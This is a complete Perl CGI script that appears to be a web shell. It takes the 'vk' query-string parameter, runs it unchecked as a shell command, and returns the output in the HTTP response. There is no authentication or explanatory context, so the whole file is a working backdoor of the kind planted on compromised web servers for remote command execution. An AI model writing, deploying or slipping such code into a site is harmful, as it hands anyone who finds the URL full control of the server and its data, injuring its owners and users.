#!/usr/bin/perl -I/usr/local/bandmain

use strict;

my ($cmd, %FORM);

$|=1;

print "Content-Type: text/html\r\n";
print "\r\n";

%FORM = parse_parameters($ENV{'QUERY_STRING'});

if(defined $FORM{'vk'}) {
  $cmd = $FORM{'vk'};
}



if(defined $FORM{'vk'}) {
  print "\n";

  open(CMD, "($cmd) 2>&1 |") || print "Could not execute command";

  while(<CMD>) {
    print;
  }

  close(CMD);
  print "\n";
}

print "</pre>";

sub parse_parameters ($) {
  my %ret;

  my $input = shift;

  foreach my $pair (split('&', $input)) {
    my ($var, $value) = split('=', $pair, 2);
    
    if($var) {
      $value =~ s/\+/ /g ;
      $value =~ s/%(..)/pack('c',hex($1))/eg;

      $ret{$var} = $value;
    }
  }

  return %ret;
}